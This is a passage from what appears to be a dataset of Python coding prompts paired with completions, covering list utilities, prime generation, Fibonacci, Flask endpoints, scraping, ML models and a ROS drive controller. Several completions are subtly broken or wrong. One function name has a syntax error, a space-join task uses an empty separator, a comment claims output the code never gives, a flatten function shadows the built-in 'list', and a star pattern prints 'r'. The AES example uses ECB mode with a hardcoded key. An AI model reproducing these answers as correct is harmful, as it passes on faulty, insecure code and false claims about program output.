sum_of_squares"},{"prompt":"Write a python program which will show the number of even numbers in a list. [1, 2, 3, 4, 5, 6]","completion":"def count_even_numbers(list): count = 0 for num in list: if num % 2 == 0: count += 1 return count"},{"prompt":"Write a Python program to format a number with leading zeros.","completion":"def leading_zeros(num, zeros=6): return str(num).zfill(zeros)"},{"prompt":"Construct a Python program to remove duplicate values from a list. [1, 2, 1, 4, 6, 2]","completion":"def remove_duplicates(list): new_list = [] for item in list: if item not in new_list: new_list.append(item) return new_list"},{"prompt":"Write a Python program to print an empty square based on size Size = 8","completion":"def print_square(size): # loop to print size number of lines for _ in range(size): # print stars on each line print(\\"*\\" * size) if __name__ == '__main__': size = 8 print_square(size)"},{"prompt":"Create a program in Python that takes a given string and prints out the number of times each letter occurs in the string. Hello World","completion":"def count_letters(str): # initialize an empty dictionary counts = {} # count the frequency of each letter for letter in str: if letter in counts: counts[letter] += 1 else: counts[letter] = 1 return counts # main program str = \\"Hello World\\" counts = count_letters(str) #print the resulting dictionary print(\\"Letter counts: \\", counts)"},{"prompt":"mplement a genetic algorithm in Python for solving an optimization problem. The algorithm should find the minimum of a given function. The function is f(x) = x^2 – 5x + 6","completion":"import random def fitness_function(x): return x**2 - 5*x + 6 #target function def gen_population(population_size): population = [] for _ in range(population_size): individual = random.random() * 10 population.append(individual) return population def selection(population): # Calculate fitness values fitness_values = [] for individual in population: fitness_values.append(fitness_function(individual)) # Select fittest individual fittest_individual = population[fitness_values.index(min(fitness_values))] return fittest_individual def mutate(indivudal): mutate_prob = 0.2 rand = random.random() if rand < mutate_prob: mutated_individual = indivudal * random.uniform(0.5,1.5) else: mutated_individual = indivudal return mutated_individual def crossover(parent1, parent2): crossover_prob = 0.7 rand = random.random() if rand < crossover_prob: offspring = [] offspring.append((parent1 + parent2)/2) else: offspring = [parent1, parent2] return offspring def genetic_algorithm(population_size): population = gen_population(population_size) for epoch in range(100): fittest_individual = selection(population) population = [mutate(individual) for individual in population] population = [crossover(parent1, parent2) for parent1, parent2 in zip(population[0::2], population[1::2])] return fittest_individual print(genetic_algorithm(50)) # Prints the minimum of the function"},{"prompt":"Convert the following code into equivalent Python 3 function. function doubleString(str) { return str + str; }","completion":"def doubleString(str): return str + str"},{"prompt":"Write a function in Python that computes the average of all numbers in a given list. numbers = [4, 8, 6, 2, 10]","completion":"def compute_average(numbers): total = 0 for num in numbers: total += num return total / len(numbers) average = compute_average(numbers) print(average) # Outputs 6"},{"prompt":"Create a Python script that takes in a string of text and returns the number of characters that contain a vowel.","completion":"def count_vowels(text): counter = 0 for char in text: if char in \\"aeiouAEIOU\\": counter += 1 return counter"},{"prompt":"Create an API with a Python Flask backend that returns the average number of a given list of numbers. [6, 7, 9, 8]","completion":"from flask import Flask, request, jsonify # create the flask app app = Flask(__name__) # define an endpoint to compute the average value @app.route(\\"/average\\", methods=['POST']) def average(): # get the list of numbers from the request numbers = request.json # compute the average avg = sum(numbers)/len(numbers) # return the average return jsonify({ 'average': avg }) # start the server if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Classify the following programming languages: JavaScript, Python, R, PHP, Java, and C. Not applicable","completion":"JavaScript: Scripting/Web Python: Scripting/General-purpose R: Statistical/Data Science PHP: Scripting/Web Java: Object-oriented/General-purpose C: Low-level/Systems programming"},{"prompt":"Write a python program to generate the first n prime numbers. n = 10","completion":"def generate_prime_numbers(n): prime_numbers = [] count = 0 num = 2 while count < n: is_prime = True for i in range(2, num): if num % i == 0: is_prime = False break if is_prime: prime_numbers.append(num) count += 1 num += 1 return prime_numbers primes = generate_prime_numbers(n) print(primes) # Outputs [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]"},{"prompt":"Generate a Python function to calculate the sum of the first 100 positive natural numbers Not applicable","completion":"def sum_first_100_natural_numbers(): total = 0 for i in range(1,101): total += i return total # example print(sum_first_100_natural_numbers()) # output: 5050"},{"prompt":"Write a Python program to print out all the distinct elements of an array.","completion":"def print_distinct(lst): seen = set() distinct = [] for x in lst: if x not in seen: distinct.append(x) seen.add(x) print(distinct)"},{"prompt":"Create a Python program that finds all combinations of two given numbers that sum up to a given goal.","completion":"def combination sums(nums, target): result = [] for i in range(len(nums)): x = nums[i] for j in range(i + 1, len(nums)): if (x + nums[j]) == target: result.append([x,nums[j]]) return result"},{"prompt":"Create a program to calculate the Fibonacci number for a given number using Python. Not applicable","completion":"def Fibonacci(n): if n<0: print(\\"Incorrect input\\") # First Fibonacci number is 0 elif n==1: return 0 # Second Fibonacci number is 1 elif n==2: return 1 else: return Fibonacci(n-1)+Fibonacci(n-2) # Driver Program print(Fibonacci(9))"},{"prompt":"Construct a Python program to sum the items of a given list. [3, 5, 6, 10]","completion":"def list_sum(input_list): \\"\\"\\"Computes the sum of the items of a given list.\\"\\"\\" output = 0 for item in input_list: output += item return output print(list_sum([3, 5, 6, 10]))"},{"prompt":"Develop an automated tool that can convert Python code to C++ code. Not applicable","completion":"import ast import sys from cpp import parser, generator def py2cpp(py_code): py_ast = ast.parse(py_code) cpp_ast = parser.convert(py_ast) cpp_code = generator.convert(cpp_ast) return cpp_code if __name__ == '__main__': py_code = sys.stdin.read() cpp_code = py2cpp(py_code) sys.stdout.write(cpp_code)"},{"prompt":"Design a simple OOP calculator class in Python to carry our basic arithematic operations.","completion":"class SimpleCalculator: \\"\\"\\"A simple class which has methods to do basic arithmetic operations.\\"\\"\\" def __init__(self): \\"\\"\\"Initializing an instance of the SimpleCalculator class.\\"\\"\\" self.result = 0 def __str__(self): \\"\\"\\"Returns the string representation for the SimpleCalculator class.\\"\\"\\" return \\"Simple Calculator\\" def add(self, num1, num2): self.result = num1 + num2 return self.result def subtract(self, num1, num2): self.result = num1 - num2 return self.result def multiply(self, num1, num2): self.result = num1 * num2 return self.result def divide(self, num1, num2): self.result = num1 / num2 return self.result"},{"prompt":"Write a python program to concatenate strings within a given list and join them using a space. [Hello, World]","completion":"''.join(str(x) for x in [\\"Hello\\", \\"World\\"])"},{"prompt":"Print the Fibonacci sequence up to a given number in Python. 10","completion":"# Declare a function def Fibonacci(num): a = 0 b = 1 # Iterate for i in range(num): print(a, end=\\" \\") c = a + b a = b b = c print() # Print the sequence Fibonacci(10)"},{"prompt":"Generate a Python function to print a pattern of stars n = 5","completion":"def starPattern(n): # outer loop to handle number of rows for i in range(0, n): # inner loop to handle number of columns for j in range(0, i + 1): # printing stars print(\\"* \\", end=\\"\\") # ending line after each row print(\\"r\\") # Driver code n = 5 starPattern(n)"},{"prompt":"Calculate the number of days between two dates in Python. date1 = '20200818' date2 = '20200901'","completion":"from datetime import date # Function to calculate number of days between two dates def getNumberOfDays(date1, date2): return (date2 - date1).days # Driver program date1 = date(2020, 8, 18) date2 = date(2020, 9, 1) print(getNumberOfDays(date1, date2))"},{"prompt":"Write a Python program to encrypt a plaintext using Advanced Encryption Standard (AES). Plaintext: This is a secret message","completion":"from Crypto.Cipher import AES plaintext = \\"This is a secret message\\" key = b\\"Sixteen Byte Key\\" cipher = AES.new(key, AES.MODE_ECB) encrypted_text = cipher.encrypt(plaintext.encode('utf-8')) print(encrypted_text.hex()) # Output c3a40f3dce503efa1f00561d60e579b9"},{"prompt":"Can you modify this Python program to store strings in a dictionary instead of lists? data = [['a', 1], ['b', 2], ['c', 3], ['a', 4]]","completion":"data = {'a': [1, 4], 'b': [2], 'c': [3]}"},{"prompt":"Construct an algorithm in python that evaluates whether a number is an Armstrong number (371 is an Armstrong number where 3<sup>3</sup> + 7<sup>3</sup> + 1<sup>3</sup> = 371) 371","completion":"def isArmstrong(num): temp = num sum = 0 while temp > 0: digit = temp % 10 sum += digit ** 3 temp //= 10 if num == sum: return True else: return False if __name__ == \\"__main__\\": num = 371 result = isArmstrong(num) if result == True: print(f\\"{num} is an Armstrong number\\") else: print(f\\"{num} is not an Armstrong number\\")"},{"prompt":"Using Python and TensorFlow, optimize a convolutional neural network model so that its prediction accuracy is maximized. Not applicable.","completion":"import tensorflow as tf import numpy as np # model definition model = tf.keras.models.Sequential([ tf.keras.layers.Conv2D(32, (3, 3), activation='relu', input_shape=(32, 32, 3)), tf.keras.layers.MaxPooling2D((2, 2)), tf.keras.layers.Conv2D(64, (3, 3), activation='relu'), tf.keras.layers.MaxPooling2D((2, 2)), tf.keras.layers.Conv2D(64, (3, 3), activation='relu'), tf.keras.layers.Flatten(), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dense(10, activation='softmax') ]) # optimization model.compile(optimizer='sgd', loss='sparse_categorical_crossentropy', metrics=['accuracy']) # data train_data = np.load('train_data.npy') train_labels = np.load('train_labels.npy') X_train = train_data/255. y_train = train_labels # fitting model.fit(X_train, y_train, epochs=10, validation_split=0.2)"},{"prompt":"Generate a random password that contains 10 digits in Python.","completion":"import random def generate_password(): data = \\"0123456789\\" length = 10 password = \\"\\".join(random.sample(data, length)) return password print(generate_password())"},{"prompt":"Create a database using Python to store information about movie reviews.","completion":"import sqlite3 # create an in-memory SQLite3 database db_connection = sqlite3.connect(':memory:') cursor = db_connection.cursor() # Create a table called 'reviews' cursor.execute('''CREATE TABLE reviews (movie_name text, review_text text, reviewer_name text, rating int)''') db_connection.commit()"},{"prompt":"Given a string, write a python program to print the next largest palindrome. 1234","completion":"def next_largest_palindrome(num): # convert string to a number num = int(num) # increment number by 1 num += 1 while not is_palindrome(str(num)): # increment number by 1 num += 1 return num def is_palindrome(num): return num == num[::-1] print(next_largest_palindrome(\\"1234\\")) # Output: 1331"},{"prompt":"Create a function in Python that takes two strings and checks if they are anagrams of each other. apple, pleap","completion":"def is_anagram(str1, str2): if len(str1)!= len(str2): return False first_list = list(str1.lower()) second_list = list(str2.lower()) first_list.sort() second_list.sort() return first_list == second_list print(is_anagram(\\"apple\\",\\"pleap\\"))"},{"prompt":"Build a program to remove all duplicate words from a given list of strings [Python, Python, programming, language, language]","completion":"def remove_duplicates(lst): new_list = [] for i in lst: if i not in new_list: new_list.append(i) return new_list print(remove_duplicates([\\"Python\\", \\"Python\\", \\"programming\\", \\"language\\", \\"language\\"]))"},{"prompt":"mplement a function in Python that takes a list of integers and a number and returns a list of numbers that have the given number as their sum. lst = [1, 2, 3, 4] num = 4","completion":"def find_combos(lst, num): result = [] for i in range(len(lst)): for j in range(i+1, len(lst)): if lst[i] + lst[j] == num: result.append([lst[i], lst[j]]) return result print(find_combos([1, 2, 3, 4], 4)) # Output: [[1, 3], [2, 2], [3, 1]]"},{"prompt":"Generate a Python program to calculate the area of a rectangle given two parameters representing the length and the width. Not applicable","completion":"def area_rectangle(length, width): return length * width print(area_rectangle(2, 3)) # Output: 6"},{"prompt":"Construct a Python program to encrypt a given text using the Caesar cipher. abc","completion":"def encrypt_caesar(text, shift): \\"\\"\\"Encrypt the text using the Caesar cipher\\"\\"\\" encrypted_text = \\"\\" for char in text: if char.isalpha(): encrypted_char = chr(ord(char) + shift) if encrypted_char.isalpha(): encrypted_text += encrypted_char else: encrypted_text += chr(ord(encrypted_char) - 26) else: encrypted_text += char return encrypted_text result = encrypt_caesar('abc', 2) print(result)"},{"prompt":"Please rank the following libraries according to their relevance for our program in Python. NumPy, SciPy, Pand","completion":"NumPy > SciPy > Pandas"},{"prompt":"Construct a python program to flatten a nested list recursively. list = [[1,2,3], [4,5], [6]]","completion":"# Defining a function to flatten a nested list def flatten(list): flatlist = [] for item in list: if isinstance(item, list): flatlist.extend(flatten(item)) else: flatlist.append(item) return flatlist # Testing the flatten function list = [[1,2,3], [4,5], [6]] print(flatten(list)) # [1, 2, 3, 4, 5, 6]"},{"prompt":"Create a web scraper in Python that fetches news headlines from different news outlets. Not applicable","completion":"import requests from bs4 import BeautifulSoup url = \\"http://example.com/\\" # Fetch the page r = requests.get(url) html = r.text # Parse the html soup = BeautifulSoup(html, 'html.parser') # Extract headlines headlines = soup.find_all('h3') for headline in headlines: print(headline.get_text())"},{"prompt":"Given a data frame that has the following columns 'Name', 'Phone', and 'Email', use Python to print the name and phone number of all customers in the data frame.","completion":"import pandas as pd df = pd.read_csv(\\"data.csv\\") for index, row in df.iterrows(): print(\\"Name:\\", row['Name'], \\"Phone:\\", row['Phone'])"},{"prompt":"Create a Python program to simulate a vending machine with two coins, a quarter and a dime. No inpu","completion":"class VendingMachine: def __init__(self): self.coins_inserted = 0 def insert_coins(self, quarters, dimes): self.coins_inserted += quarters * 25 + dimes * 10 def get_coins_inserted(self): return self.coins_inserted"},{"prompt":"Create a python script to output all the valid paths from the root to the leaves of a tree. tree = { Root: { A: { A1: {}, A2: {} }, B: { B1: {}, B2: {} } } }","completion":"def list_paths(tree, path=[]): all_paths = [] head = list(tree.keys())[0] tail = tree[head] if path: cur_path = path + [head] else: cur_path = [head] if not tail: all_paths.append(cur_path) else: for node in tail.keys(): all_paths += list_paths(tail[node], cur_path) return all_paths list_paths(tree)"},{"prompt":"Create a python program to remove all the values in a list that are greater than a given value. list = [10, 15, 20, 25, 30], remove values greater than 15","completion":"# Defining a function to remove all the values in a list that are greater than a given value def remove_greater(list, n): return [val for val in list if val <= n] # Testing the remove_greater() function list = [10, 15, 20, 25, 30] print(remove_greater(list, 15)) # [10, 15]"},{"prompt":"Create a class in Python for representing a Stack data structure. The class should support two methods: push and pop. Not applicable","completion":"class Stack: def __init__(self): self._items = [] def push(self, item): self._items.append(item) def pop(self): return self._items.pop()"},{"prompt":"Generate a program to output the most frequently used words in a given string txt = Python is a powerful language that is used for a wide range of applications","completion":"from collections import Counter def most_frequent(string): data = string.split(\\" \\") data1 = Counter(data) return data1.most_common(1)[0] txt = \\"Python is a powerful language that is used for a wide range of applications\\" assert most_frequent(txt) == ('is', 2) print(\\"Most frequent word is : \\", most_frequent(txt))"},{"prompt":"Create a Python program that recommends products based on the input preferences. Example input: Preferences: User likes items of type 'clothing'.","completion":"# Define a function to get recommendations for a given user def get_recommendations(user): # Get the user preferences user_preferences = user.get_preferences() # Initialize an empty list for recommendations recommendations = [] # Get all products of type 'clothing' clothing_products = get_all_products('clothing') # Iterate over the clothing products for product in clothing_products: # Calculate the similarity score score = calculate_similarity_score(product, user_preferences) # If the score is greater than 0, add the product to the list of recommendations if score > 0: recommendations.append(product) # Return the list of recommendations return recommendations"},{"prompt":"Given two strings s and t, create a new Python function to check if s is an anagram of t. s = anagram t = nagaram","completion":"def is_anagram(s, t): s_list = list(s) t_list = list(t) s_list.sort() t_list.sort() if s_list == t_list: return True else: return False"},{"prompt":"Create a supervised Machine Learning classification model in Python to predict the type of animal based on four numerical features. Not applicable","completion":"import pandas as pd from sklearn.preprocessing import StandardScaler from sklearn.model_selection import train_test_split from sklearn.neighbors import KNeighborsClassifier # Read the dataset dataset = pd.read_csv('dataset.csv') # Define features and labels X = dataset.iloc[:, :4] y = dataset.iloc[:, -1] # Split the dataset into training set and test set X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.2) # Normalize the data scaler = StandardScaler() X_train = scaler.fit_transform(X_train) X_test = scaler.transform(X_test) # Create and train the model model = KNeighborsClassifier(n_neighbors=3) model.fit(X_train, y_train) # Test the model accuracy = model.score(X_test, y_test) print('Accuracy: ', accuracy)"},{"prompt":"Develop an ordinary least squares regression model in Python for the following data and explain the meaning of the parameters: independent variables (x1, x2): 2.0, 5.0 dependent variables (y): 7.5","completion":"import numpy as np from sklearn.linear_model import LinearRegression # define input data X = np.array([[2.0,5.0]]) y = np.array([7.5]) # initialise and train the model regr = LinearRegression() regr.fit(X, y) # The coefficients print('Coefficient/Parameter: ', regr.coef_) # The intercept print('Intercept: ', regr.intercept_) # The meaning of the parameters: # The coefficient/Parameters is the slope of the regression line. It indicates the effect that a unit change in one of the independent variables has on the dependent variable. # The intercept is the point where the regression line intersects the y-axis. It indicates the value of the dependent variable when all independent variables are equal to zero."},{"prompt":"Edit the given code segment in Python and make it a valid program: x = 5 def add_two_numbers(x, y): z = x + y return z","completion":"x = 5 def add_two_numbers(x, y): z = x + y return z result = add_two_numbers(x, 5) print(result)"},{"prompt":"This code is a controller for a differential drive. To use it, you need to create an instance of the DiffController class, passing in the device and name as arguments. Then, call the startup() method to initialize the controller. Finally, call the update() method in a loop to update the controller and handle movement requests. The cmdVelCb() method can be used to handle movement requests. The shutdown() method can be called to stop the controller. The getDiagnostics() method can be used to get a diagnostics status.","completion":"#!/usr/bin/env python \\"\\"\\" diff_controller.py - controller for a differential drive Copyright (c) 2010-2011 Vanadium Labs LLC. All right reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. * Neither the name of Vanadium Labs LLC nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \\"AS IS\\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL VANADIUM LABS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \\"\\"\\" import rospy from math import sin,cos,pi from geometry_msgs.msg import Quaternion from geometry_msgs.msg import Twist from nav_msgs.msg import Odometry from diagnostic_msgs.msg import * from tf.broadcaster import TransformBroadcaster from ax12 import * from controllers import * from struct import unpack class DiffController(Controller): \\"\\"\\" Controller to handle movement & odometry feedback for a differential drive mobile base. \\"\\"\\" def __init__(self, device, name): Controller.__init__(self, device, name) self.pause = True self.last_cmd = rospy.Time.now() # parameters: rates and geometry self.rate = rospy.get_param('~controllers/'+name+'/rate',10.0) self.timeout = rospy.get_param('~controllers/'+name+'/timeout',1.0) self.t_delta = rospy.Duration(1.0/self.rate) self.t_next = rospy.Time.now() + self.t_delta self.ticks_meter = float(rospy.get_param('~controllers/'+name+'/ticks_meter')) self.base_width = float(rospy.get_param('~controllers/'+name+'/base_width')) self.base_frame_id = rospy.get_param('~controllers/'+name+'/base_frame_id', 'base_link') self.odom_frame_id = rospy.get_param('~controllers/'+name+'/odom_frame_id', 'odom') # parameters: PID self.Kp = rospy.get_param('~controllers/'+name+'/Kp', 5) self.Kd = rospy.get_param('~controllers/'+name+'/Kd', 1) self.Ki = rospy.get_param('~controllers/'+name+'/Ki', 0) self.Ko = rospy.get_param('~controllers/'+name+'/Ko', 50) # parameters: acceleration self.accel_limit = rospy.get_param('~controllers/'+name+'/accel_limit', 0.1) self.max_accel = int(self.accel_limit*self.ticks_meter/self.rate) # output for joint states publisher self.joint_names = [\\"base_l_wheel_joint\\",\\"base_r_wheel_joint\\"] self.joint_positions = [0,0] self.joint_velocities = [0,0] # internal data self.v_left = 0 # current setpoint velocity self.v_right = 0 self.v_des_left = 0 # cmd_vel setpoint self.v_des_right = 0 self.enc_left = None # encoder readings self.enc_right = None self.x = 0 # position in xy plane self.y = 0 self.th = 0 self.dx = 0 # speeds in x/rotation self.dr = 0 self.then = rospy.Time.now() # time for determining dx/dy # subscriptions rospy.Subscriber(\\"cmd_vel\\", Twist, self.cmdVelCb) self.odomPub = rospy.Publisher(\\"odom\\", Odometry, queue_size=5) self.odomBroadcaster = TransformBroadcaster() rospy.loginfo(\\"Started DiffController (\\"+name+\\"). Geometry: \\" + str(self.base_width) + \\"m wide, \\" + str(self.ticks_meter) + \\" ticks/m.\\") def startup(self): if not self.fake: self.setup(self.Kp,self.Kd,self.Ki,self.Ko) def update(self): now = rospy.Time.now() if now > self.t_next: elapsed = now - self.then self.then = now elapsed = elapsed.to_sec() if self.fake: x = cos(self.th)*self.dx*elapsed y = -sin(self.th)*self.dx*elapsed self.x += cos(self.th)*self.dx*elapsed self.y += sin(self.th)*self.dx*elapsed self.th += self.dr*elapsed else: # read encoders try: left, right = self.status() except Exception as e: rospy.logerr(\\"Could not update encoders: \\" + str(e)) return rospy.logdebug(\\"Encoders: \\" + str(left) +\\",\\"+ str(right)) # calculate odometry if self.enc_left == None: d_left = 0 d_right = 0 else: d_left = (left - self.enc_left)/self.ticks_meter d_right = (right - self.enc_right)/self.ticks_meter self.enc_left = left self.enc_right = right d = (d_left+d_right)/2 th = (d_right-d_left)/self.base_width self.dx = d / elapsed self.dr = th / elapsed if (d != 0): x = cos(th)*d y = -sin(th)*d self.x = self.x + (cos(self.th)*x - sin(self.th)*y) self.y = self.y + (sin(self.th)*x + cos(self.th)*y) if (th != 0): self.th = self.th + th # publish or perish quaternion = Quaternion() quaternion.x = 0.0 quaternion.y = 0.0 quaternion.z = sin(self.th/2) quaternion.w = cos(self.th/2) self.odomBroadcaster.sendTransform( (self.x, self.y, 0), (quaternion.x, quaternion.y, quaternion.z, quaternion.w), rospy.Time.now(), self.base_frame_id, self.odom_frame_id ) odom = Odometry() odom.header.stamp = now odom.header.frame_id = self.odom_frame_id odom.pose.pose.position.x = self.x odom.pose.pose.position.y = self.y odom.pose.pose.position.z = 0 odom.pose.pose.orientation = quaternion odom.child_frame_id = self.base_frame_id odom.twist.twist.linear.x = self.dx odom.twist.twist.linear.y = 0 odom.twist.twist.angular.z = self.dr self.odomPub.publish(odom) if now > (self.last_cmd + rospy.Duration(self.timeout)): self.v_des_left = 0 self.v_des_right = 0 # update motors if not self.fake: if self.v_left < self.v_des_left: self.v_left += self.max_accel if self.v_left > self.v_des_left: self.v_left = self.v_des_left else: self.v_left -= self.max_accel if self.v_left < self.v_des_left: self.v_left = self.v_des_left if self.v_right < self.v_des_right: self.v_right += self.max_accel if self.v_right > self.v_des_right: self.v_right = self.v_des_right else: self.v_right -= self.max_accel if self.v_right < self.v_des_right: self.v_right = self.v_des_right self.write(self.v_left, self.v_right) self.t_next = now + self.t_delta def shutdown(self): if not self.fake: self.write(0,0) def cmdVelCb(self,req): \\"\\"\\" Handle movement requests. \\"\\"\\" self.last_cmd = rospy.Time.now() if self.fake: self.dx = req.linear.x # m/s self.dr = req.angular.z # rad/s else: # set motor speeds in ticks per 1/30s self.v_des_left = int( ((req.linear.x - (req.angular.z * self.base_width/2.0)) * self.ticks_meter) / 30.0) self.v_des_right = int( ((req.linear.x + (req.angular.z * self.base_width/2.0)) * self.ticks_meter) / 30.0) def getDiagnostics(self): \\"\\"\\" Get a diagnostics status. \\"\\"\\" msg = DiagnosticStatus() msg.name = self.name msg.level = DiagnosticStatus.OK msg.message = \\"OK\\" if not self.fake: msg.values.append(KeyValue(\\"Left\\", str(self.enc_left))) msg.values.append(KeyValue(\\"Right\\", str(self.enc_right))) msg.values.append(KeyValue(\\"dX\\", str(self.dx))) msg.values.append(KeyValue(\\"dR\\", str(self.dr))) return msg # # Controller Specification: # # setup: Kp, Kd, Ki, Ko (all unsigned char) # # write: left_speed, right_speed (2-byte signed, ticks per frame) # # status: left_enc, right_enc (4-byte signed) # def setup(self, kp, kd, ki, ko): success = self.device.execute(253, AX_CONTROL_SETUP, [10, kp, kd, ki, ko]) def write(self, left, right): \\"\\"\\" Send a closed-loop speed. Base PID loop runs at 30Hz, these values are therefore in ticks per 1/30 second. \\"\\"\\" left = left&0xffff right = right&0xffff success = self.device.execute(253, AX_CONTROL_WRITE, [10, left%256, left>>8, right%256, right>>8]) def status(self): \\"\\"\\" read 32-bit (signed) encoder values. \\"\\"\\" values = self.device.execute(253, AX_CONTROL_STAT, [10]) left_values = \\"\\".join([chr(k) for k in values[0:4] ]) right_values = \\"\\".join([chr(k) for k in values[4:] ]) try: left = unpack('=l',left_values)[0] right = unpack('=l',right_values)[0] return [left, right] except: return None"},{"prompt":"Write a Python program to find the longest common substring in two given strings. xyzabcd, aabcdxyz","completion":"def longest_common_substring(str1, str2): n1 = len(str1) n2 = len(str2) maxi = 0 c = [[0 for x in range(n2+1)] for x in range(n1+1)] result = 0 for i in range(n1): for j in range(n2): if (str1[i] == str2[j]): if(i == 0 or j == 0): c[i][j] = 1 else: c[i][j] = c[i -1][j-1] + 1 if (c[i][j] > maxi): maxi = c[i][j] result = i - maxi + 1 return str1[result:result + maxi] print(longest_common_substring(\\"xyzabcd\\", \\"aabcdxyz\\")) # abcd"},{"prompt":"Create a Python program that classifies a given sentence as positive, neutral, or negative. The movie was really terrible.","completion":"def predict_sentiment(sentence): pred = model.predict([sentence]) if pred[0] == 0: print(\\"Negative sentiment\\") elif pred[0] == 1: print(\\"Neutral sentiment\\") else: print(\\"Positive sentiment\\")"},{"prompt":"Create a data structure in Python to store employee names and their corresponding salaries. Michael 45000, Andrew 55000, Mark 70000","completion":"employee_data = { \\"Michael\\": 45000, \\"Andrew\\": 55000, \\"Mark\\": 70000 }"},{"prompt":"Design an algorithm in Python that prints out all the prime numbers up to a certain number. n = 15","completion":"def is_prime(n): if n == 1: return False for i in range(2, int(n ** 0.5) + 1): if n % i == 0: return False return True def get_prime_numbers(n): result = [] for num in range(2, n+1): if is_prime(num): result.append(num) return result prime_numbers = get_prime_numbers(15) print(prime_numbers)"},{"prompt":"Write a basic web scraper in Python using the BeautifulSoup library. The scraper should take as input a URL and output the text on the page. Input URL: https://en.wikipedia.org/wiki/Web_scraping","completion":"import requests from bs4 import BeautifulSoup url = \\"https://en.wikipedia.org/wiki/Web_scraping\\" response = requests.get(url) soup = BeautifulSoup(response.text, 'html.parser') text = soup.find_all('p') for t in text: print(t.text)"},{"prompt":"Create a Python script to detect any missing numbers in a given sorted array and return the missing numbers. [2, 3, 5, 6, 7, 8, 10]","completion":"def missingNumbers(arr): start = arr[0] end = arr[len(arr)-1] result = [] for i in range(start, end+1): if i not in arr: result.append(i) return result # Test Case arr = [2, 3, 5, 6, 7, 8, 10] print(missingNumbers(arr)) # Output: # [4, 9]"},{"prompt":"Construct a Python class to represent a point in the Cartesian plane.","completion":"class Point: def __init__ (self, x=0, y=0): self.x = x self.y = y def __str__ (self): return \\"({0},{1})\\".format(self.x,self.y) def distance_from_origin (self): return ((self.x ** 2) + (self.y ** 2)) ** 0.5"},{"prompt":"Write Python code to parse a PDF document and extract all text from it. None","completion":"import PyPDF2 #open the pdf file pdfFileObj = open('sample.pdf', 'rb') #create an object for pdf file pdfReader = PyPDF2.PdfFileReader(pdfFileObj) #get number of pages numPages = pdfReader.numPages #print no. of pages print(\\"Number of pages:\\", numPages) #define a counter count = 0 #while loop to read each page while count < numPages: #define a page object pageObj = pdfReader.getPage(count) #extract text from the page object print (pageObj.extractText()) #increment the counter count += 1 #closing pdf file object pdfFileObj.close()"},{"prompt":"Design a Python program to print prime numbers between two given integer numbers. 30, 50","completion":"#Function to check if a number is prime def checkPrime(num): if num > 1: for i in range(2, num): if (num % i) == 0: return False return True else: return False #Function to find prime numbers in given range def getPrimeNumbersInRange(low,high): if low < high: for i in range(low,high + 1): if checkPrime(i): print(i,\\" is a prime number\\") #Call the function low = 30 high = 50 getPrimeNumbersInRange(low, high)"},{"prompt":"Develop a Python program that takes a natural number N as input, and returns a list of the first N prime numbers. N = 10","completion":"# Python3 Program to print a # list of prime numbers # Function to generate prime numbers def generatePrimeNumbers(N): checkprime = 1 # variable to check prime number prime = [2] # List to store prime numbers count = 1 # Counter to store number of prime numbers for num in range(3, N + 1, 2): for j in range(2, num): # If anything neatly divides the number, don't consider it prime if (num % j == 0): checkprime = 0 # Otherwise check if it isPrime if (checkprime != 0): prime.append(num) count += 1 checkprime = 1 # Store only First N Prime Numbers if(count == N): return prime # Driver code N = 10 prime = generatePrimeNumbers(N) print(\\"First\\", N, \\"prime numbers are:\\") for i in range(0, N): print(prime[i], end = \\" \\")"},{"prompt":"Generate a python script that replaces each character in a string with its reverse: string = 'Hello World'","completion":"def reverseString(string): n = len(string) # create an empty array revString = [0 for i in range(n)] for i in range(n): revString[n-i-1] = string[i] return \\"(\\" + ''.join(revString) + \\")\\" print(reverseString(\\"Hello World\\"))"},{"prompt":"Create a program in Python that given a list of integer inputs, sorts them in descending order. list = [4, 9, 2, 6, 5]","completion":"list = [4, 9, 2, 6, 5] # sort list in descending order list.sort(reverse=True) print(list) # [9, 6, 5, 4, 2]"},{"prompt":"Create a correct python code to combine two lists into one. listA = [1, 2, 3] listB = [4, 5, 6]","completion":"listA = [1, 2, 3] listB = [4, 5, 6] combined_list = listA + listB print(combined_list)"},{"prompt":"Create a python script to generate all possible valid parentheses combinations with n pairs of parentheses.","completion":"def generate_parentheses(n): \\"\\"\\" Generates all possible valid parentheses combinations with n pairs of parentheses. \\"\\"\\" res = [] def backtrack(s = '', left = 0, right = 0): if len(s) == 2 * n: res.append(s) return if left < n: backtrack(s + '(', left+1, right) if right < left: backtrack(s + ')', left, right+1) backtrack() return res print(generate_parentheses(3))"},{"prompt":"Construct a web service using flask that takes a JSON payload and returns a response in the form of a python dictionary","completion":"from flask import Flask, request import json app = Flask(__name__) @app.route('/web_service', methods=['POST']) def web_service(): json_payload = request.get_json() # Do stuff to manipulate the data # ... response_dictionary = { 'key1': 'val1', 'key2': 'val2', } return json.dumps(response_dictionary) if __name__ == '__main__': app.run()"},{"prompt":"Generate a Python script to delete the duplicate element from an array. [3, 8, 4, 3, 2, 8]","completion":"def removeDuplicates(arr): final_list = [] for num in arr: if num not in final_list: final_list.append(num) return final_list # Driver 